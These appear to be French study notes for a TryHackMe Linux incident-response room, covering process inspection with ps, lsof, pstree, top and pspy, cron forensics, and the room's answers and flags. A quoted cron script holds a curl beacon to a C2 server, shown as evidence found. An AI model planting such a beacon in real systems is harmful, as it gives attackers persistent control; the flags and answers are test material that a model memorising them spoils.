
## Introduction
Dans une analyse à chaud (directement sur le système), il est important d'avoir les repertoires suivants "propre", pour être sur que les binaires ne soit pas compromis, et fournir de vraie preuve. 
 - `bin`
 - `sbin` 
 - `lib`
 - `lib64`

Pour ça il nous faut intégrer des binaires "propre", qui viennent d'une installation neuve. Voici comment les importer dans notre machine : 
```Bash
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

## Processus 
Un processus est un instance en cours d'exécution. Chaque processus possède un PID (Process ID) unique, cela permet au système de le gérer et de le suivre.

Les processus peuvent avoir une relation parent-enfant, le parent appel l'enfant. Ils seront "attaché" l'un à l'autre (nous pourrons voir quel est le parent du processus enfant, et quel processus à appeler le parent). 

Nous avons plusieurs utilitaire qui peuvent être utilisé pour voir les processus en cours d'exécution :

### PS
La commande `ps` nous donne cet output : 
![[Pasted image 20251006130135.png]]
Où : 
 - `PID` : Un identifiant unique pour chaque processus
 - `TTY` : Le terminal associé au processus
 - `TIME` : Temps utilisé par le processus 
 - `CMD` : Commande associé au processus

Il est également possible d'associé un utilisateur à la commande ps (pour voir quel processus est relié à quel utilisateur) : 
![[Pasted image 20251006130454.png]]

### LSOF
`LSOF` permet de voir les fichiers ouvert par les processus système, nous pouvons associé un PID à `lsof` pour voir quel fichier/commande à été ouvert/lancé avec le processus voulu. 

Exemple d'utilisation : 
```Bash
lsof -p <PID>
```


### PSTREE
Cet utilitaire nous permet de lister les processus sous forme d'arborescence, ce qui permet de voir rapidement les relations parent-enfant. 

Exemple d'utilisation : 
```Bash
pstree -s -p <PID>
```
 - `-s` : lister les processus parent
 - `-p` : donne le PID

### TOP
Le problème des outils ci-dessus est qu'ils sont statique, ce qui permet de voir dynamiquement (et surtout en direct) les processus en cours d'execution sur la machine. Il nous donne également un plus d'information par rapport à l'utilisation du CPU et de la MEMOIRE. 

Exemple d'utilisation : 
```Bash
top -d 5 -u <user> -c
```
 - `-d` : mise à jour dynamique toutes les 5 secondes
 - `-u` : définit un utilisateurs (pas obligatoire)
 - `-c` : donne le chemin complet des commande (avec le /bin/bash)

### Question THM
```txt 
Q : Which command lists all open files and the processes that opened them?

A : lsof
```

```txt
Q : Use `pstree` to list out the process hierarchies. What is the name of the `nc` processes parent?

A : abzkd83o4jakxld
```

## Cronjobs
Cron est un outil qui permet de lancé automatiquement des processus à des moments spécifique, soit sous forme de "boucle" (toutes les secondes, minutes, heures, jours, mois ...) soit à chaque redémarrage ... 

Le fichier principal de cron se situe dans `/etc/crontab` mais il existe un repertoire qui nous donne chaque tâche par utilisateur : `/var/spool/cron/crontabs` 

```txt
Voila la nomenclature du fichier cron
M | H | Jour du Mois | Mois | Jour de la Semaine | Commande

10  05        *          *            *           /home/bob/backup_tmp.sh

Dans cet exemple tout les jours à 5:10 la tâche Backup_tmp.sh se lancera
```

Toute les tâches effectué par cron sont logué dans `syslog` nous pouvons exécuter cette commande pour voir les log lié à cron : 
```Bash
sudo grep cron /var/log/syslog

# Pour voir les tâches lié à un utilisateur
sudo grep cron /var/log/syslog | grep -i '<utilisateur>'
```

### PSPY

Pspy est un outil open source permettant de surveiller en temps réel les processus Linux sans privilèges root. Il lit directement les données du système virtuel **/proc** pour afficher des informations comme les commandes exécutées, les PID, PPID, utilisateurs et horodatages.  
Utile pour l’énumération et la réponse à incident, il permet d’identifier les processus éphémères et de suivre l’exécution de tâches **cron**, offrant ainsi une meilleure visibilité sur l’activité du système.

Exemple d'utilisation : 
```Bash
pspy64
```


### Question THM
```
Q : Search around the system for suspicious **system-level** cronjob entries. What is the full URL of the C2 server?

$ cat /etc/crontab
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 * * * * root /var/tmp/backup

$ cat /etc/cron.hourly/beacon
curl http://c2.intelligent-software.thm:8310/beacon

A : http://c2.intelligent-software.thm:8310/beacon
```

```
Q : List the **user-level** cronjobs in the system. What is the hidden flag in one of the scripts?

$ ls /var/spool/cron/crontabs/
bob  elijah  janice  root  ubuntu
$ cat /var/spool/cron/crontabs/elijah 
0 3 * * * /home/elijah/.flag.sh
$ cat /home/elijah/.flag.sh
THM{4682786cf2d92f01c4d30a2bbf4621f7}

A : THM{4682786cf2d92f01c4d30a2bbf4621f7}
```

```
Q : Use **pspy64** to monitor executions occurring through the system. What is the decoded flag value that is echoed every 15 seconds?

$ pspy64
2025/10/06 11:58:14 CMD: UID=0     PID=6370   | /bin/sh -c /bin/echo -e 'VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ==' 
2025/10/06 11:58:14 CMD: UID=0     PID=6371   | sleep 15 

$ base64 -d 'VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ==''
THM{851a981445dbfb9485c3771510a53568}

A : THM{851a981445dbfb9485c3771510a53568}
```
